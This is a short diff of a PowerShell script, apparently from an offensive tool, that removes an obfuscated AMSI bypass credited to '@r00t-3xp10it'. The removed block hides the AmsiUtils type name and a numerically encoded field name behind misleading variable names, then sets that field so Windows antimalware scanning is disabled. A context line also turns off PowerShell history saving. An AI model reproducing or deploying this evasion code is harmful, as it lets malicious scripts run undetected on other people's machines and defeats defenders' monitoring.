@@ -143,22 +143,6 @@ Write-Host "$Banner" -ForegroundColor Blue
 Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
 
 
-try {
-
-   <#
-   .SYNOPSIS
-      Author: @r00t-3xp10it
-      Helper - 'AmsiStringDetectionBypass'
-   #>
-
-   $MsTeamsId = "4456625220575263174452554847"
-   $Drawing = "Sy@ste£.M@ana"+"ge£e@nt"+".Auto@£ati@on."+"A£s@i"+"U@ti@ls" -Join ''
-   $imgForm = $Drawing.Replace("@","").Replace("£","m");$Bitmap = [Ref].Assembly.GetType($imgForm)
-   $Graphics = [string](0..13|%{[char][int](53+($MsTeamsId).substring(($_*2),2))}) -Replace ' '
-   $i0Stream = $Bitmap.GetField($Graphics,'NonPublic,Static');$i0Stream.SetValue($null,$true)
-}catch{}
-
-
 If($Help -ieq "Parameters"){
 
    <#
